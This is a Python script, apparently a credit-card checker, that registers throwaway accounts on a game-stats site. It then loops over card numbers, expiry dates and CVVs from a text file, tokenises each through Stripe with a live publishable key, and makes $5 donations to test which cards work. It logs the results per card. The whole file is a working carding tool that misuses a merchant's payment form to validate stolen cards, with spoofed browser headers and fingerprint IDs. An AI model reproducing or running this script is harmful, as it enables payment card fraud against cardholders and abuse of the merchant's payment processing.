# encoding=utf-8
import re
import requests
import random
import logging
import logger_config
from typing import Dict

# 配置日志
logger_config.configure_logger()

# 现在就可以使用 logging 模块了
logger = logging.getLogger(__name__)

def random_string(pattern: str) -> str:
    return ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') if char == 'd' else char for char in pattern)

# def ccheck(number: str,  exp_month: str, exp_year: str, cvv: str) -> None:
def ccheck() -> None:
    session: requests.Session = requests.Session()
    headers: Dict[str, str] = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
        'Pragma': 'no-cache',
        'Accept': '*/*'
    }
    session.headers.update(headers)
    # 设置代理
    # proxies: Dict[str, str] = {
    #     'http': 'http://127.0.0.1:8080',
    #     'https': 'http://127.0.0.1:8080',
    # }
    # session.proxies.update(proxies)
    verify: bool = True

    # Step 1: Get token
    response: requests.Response = session.get('https://pubglookup.com/register', verify=verify)
    # <input type="hidden" name="_token" value="z0bYDFpsJh2xPbWbzSdb8192wak3FWe77JmeXqmv">
    token: str = response.text.split('name="_token" value="')[1].split('">')[0]
    logger.info(f"Token: {token}")

    # Step 2: Register
    email: str = f'co757{random_string("ddddd")}06@gmail.com'
    password:str = 'soAByousef123'
    data: Dict[str, str] = {
        '_token': token,
        'email': email,
        'password': password
    }
    logger.warning(f"Email: {email} Password: {password}")

    response = session.post('https://pubglookup.com/register', data=data, verify=verify)
    if 'The email has already been taken.' in response.text:
        logger.info("Failure: The email has already been taken.")
        return
    elif 'You made it. One last step.' in response.text:
        logger.info("Success: You made it. One last step.")


    # 开始验卡
    card_list = cc_card()
    for line in card_list:
        parts = re.split(r'[|/]', line.strip())
        number, exp_month, exp_year, cvv = parts
        number = number.strip()
        exp_month = exp_month.strip()
        exp_year = exp_year.strip()
        cvv = cvv.strip()
        try:
            # Step 3: Get donation token
            response = session.get('https://pubglookup.com/donate', verify=verify)
            # donation_token: str = response.text.split('name="_token" value="')[1].split('">')[0]
            # match = re.search(r'const token.*?"(.+?)";', response.text)
            match = re.search(r'<meta name="csrf-token" content="(.*?)">', response.text)
            donation_token: str = match.group(1)
            logger.info(f"Donation token: {donation_token}")

            muid = "5d8cab65-540b-4bfa-9a3a-3ba1e95e7a8eb13a5b"
            guid = "0ba4ce35-0298-4f6d-b0ef-df5a88e124e7494f21"
            sid = "e6fa0836-c1f2-4380-a14c-80d198289609b32f37"

            # Step 4: Get Stripe token
            card_info: Dict[str, str] = {
                'card[number]': f'{number}',
                'card[cvc]': f'{cvv}',
                'card[exp_month]': f'{exp_month}',
                'card[exp_year]': f'{exp_year}',
                # 'guid': 'c7a88201-0d3d-4eb1-a330-344d89f7f515c05068',
                # 'muid': '1ea765a3-f7e5-4d67-adc9-cf1b7203e2144ed338',
                # 'sid': 'e43ccf13-5f23-4e2e-a849-674f12defed6391f81',
                "muid":f"{muid}",
                "guid":f"{guid}",
                "sid":f"{sid}",
                'payment_user_agent': 'stripe.js/8c9632344d; stripe-js-v3/8c9632344d; card-element',
                'time_on_page': '8000',
                'key': 'pk_live_5LOPmY5GLZaVwGWOUYhukCCV',
                'pasted_fields': 'number'
            }
            response = session.post('https://api.stripe.com/v1/tokens', data=card_info, verify=verify)
            stripe_token: str = response.json().get('id')
            logger.info(f"Stripe token: {stripe_token}")

            # Step 5: Make donation
            donation_data: Dict[str, str] = {
                'stripe_token': stripe_token,
                '_token': donation_token,
                'amount': 5
            }
            response = session.post('https://pubglookup.com/donate', data=donation_data, verify=verify)
            if 'Your card does not support this type of purchase' in response.text:
                logger.info("Failure: Your card does not support this type of purchase")
            elif 'Payment successful' in response.text:
                logger.info("Success: Payment successful")
            else:
                logger.info("Unknown response")
            match = re.search(r"<transition.*?>.*?<p>(.*?)</p>.*?</transition>", response.text, re.DOTALL)
            if match and match.group(1):
                logger.warning(f"{number}|{exp_month}|{exp_year}|{cvv}:  {match.group(1)}")
            else:
                # 不知道其他的判断条件，待完善
                logger.warning(f"can not find {number}|{exp_month}|{exp_year}|{cvv} transition, may be success?")
                logger.warning(response.text)
        except Exception as e:
            logger.error(f"{number}|{exp_month}|{exp_year}|{cvv}:  {e}")

def  cc_card(card_file :str = "card.txt") -> list:
    card_list = []
    with open(card_file) as f:
        for line in f:
            if line.strip():
                card_list.append(line.strip())
    return card_list

if __name__ == "__main__":
    ccheck()
